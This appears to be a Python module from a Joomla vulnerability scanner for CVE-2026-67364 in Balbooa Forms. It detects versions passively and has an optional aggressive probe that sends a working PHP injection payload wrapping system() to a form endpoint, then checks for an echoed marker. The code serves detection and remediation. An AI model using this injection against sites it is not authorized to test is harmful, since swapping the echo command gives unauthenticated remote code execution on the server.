from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import quote

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-67364"
NAME = "Balbooa Forms pre-auth PHP code injection via URL parameter shortcode"
COMPONENT = "Balbooa Forms"
AFFECTED_RULE = "Balbooa Forms 1.0.0 through 2.4.3.1; fixed in 2.4.3.2"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
TOKEN_RE = re.compile(r'"csrf\.token":"([a-f0-9]{32})"')
TOKEN_BODY_RE = re.compile(r"^[a-f0-9]{32}$")
LEGACY_TOKEN_PATH = "/index.php?option=com_baforms&task=form.getSessionToken"
SUBMIT_PATH = "/index.php?option=com_baforms&task=form.message"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.4.3.2")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("baforms", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Balbooa Forms was not detected via its public manifest, uploads directory, or component route.", action="No action is required unless Balbooa Forms is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Balbooa Forms {version}, within the affected range below 2.4.3.2."
        action = "Upgrade Balbooa Forms to 2.4.3.2 or newer and review forms that use the URL-parameter shortcode in a PHP action."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Balbooa Forms {version}, which escapes the URL-parameter shortcode with htmlspecialchars()."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Balbooa Forms was detected, but its version could not be determined."
        action = "Determine the installed Balbooa Forms version and upgrade to 2.4.3.2 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _session_token(client: HttpClient, base: str, timeout: int) -> str | None:
    page = client.get(f"{base}/index.php", timeout=timeout)
    if not is_transport_error(page):
        match = TOKEN_RE.search(page.get("body") or "")
        if match:
            return match.group(1)
    legacy = client.get(f"{base}{LEGACY_TOKEN_PATH}", timeout=timeout)
    if not is_transport_error(legacy) and legacy.get("status") == 200:
        body = (legacy.get("body") or "").strip()
        if TOKEN_BODY_RE.match(body):
            return body
    return None


def run_aggressive_probe(
    target_url: str,
    form_id: int = 2,
    submit_id: int = 4,
    param: str = "proof",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Inject PHP through the ``[URL parameter = X]`` shortcode.

    Balbooa Forms 2.4.3.1 substitutes the shortcode with the raw query value
    inside the optional PHP-after-submission handler. A form whose handler
    contains ``$x = "[URL parameter = proof]";`` therefore executes a
    double-quote breakout from the ``proof`` query parameter. 2.4.3.2 adds
    ``htmlspecialchars($result, ENT_QUOTES, 'UTF-8')``.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _session_token(client, base, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}/index.php", detail="No Joomla session token was available, so the form submission was not attempted.", action="Verify the component route and guest session handling on an authorized staging site.")

    marker = f"PROOFCMS_BAFORMS_URL_RCE_{secrets.token_hex(4)}"
    payload = f'" . system("echo {marker}") . "'
    url = f"{base}{SUBMIT_PATH}&{param}={quote(payload, safe='')}"
    data = {
        "form-id": str(form_id),
        "submit-btn": str(submit_id),
        "task": "form.message",
        token: "1",
    }
    response = client.request(
        url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(data),
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The form submission failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    status = response.get("status")
    executed = marker in body
    evidence = {
        "form_id": form_id,
        "submit_id": submit_id,
        "param": param,
        "token_found": True,
        "marker": marker,
        "status": status,
        "body_length": len(body),
        "marker_executed": executed,
    }
    if executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            evidence=evidence,
            detail=(
                "An unauthenticated query parameter broke out of the URL-parameter shortcode in the "
                f"PHP-after-submission handler and executed the embedded marker {marker!r}."
            ),
            action="Upgrade Balbooa Forms to 2.4.3.2 or newer and review the form's PHP action.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        evidence=evidence,
        detail=(
            f"The form submission returned HTTP {status} without the embedded marker; the form may not use the "
            "URL-parameter shortcode, may not have the PHP action, or may be patched."
        ),
        action="Upgrade affected Balbooa Forms versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _session_token(client, base, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail="The component page did not expose a Joomla session token; no form submission was attempted.", action="Verify the component route on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail="A guest session token is available; the URL-parameter payload was not sent in safe mode.", action="Use aggressive mode with the public form's form/submit ids on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Balbooa Forms was not detected as potentially affected."
            return passive
        form_value = aggressive_value(aggressive_args, aggressive_command, "form_id")
        submit_value = aggressive_value(aggressive_args, aggressive_command, "submit_id")
        param_value = aggressive_value(aggressive_args, aggressive_command, "param")
        result = run_aggressive_probe(
            target_url,
            form_id=int(form_value) if form_value and form_value.isdigit() else 2,
            submit_id=int(submit_value) if submit_value and submit_value.isdigit() else 4,
            param=param_value or "proof",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (session/token reachability) and aggressive (URL-parameter form submission) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["baforms"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-67364", "https://www.balbooa.com/forms", "https://mysites.guru/vulnerabilities/CVE-2026-67364"]}
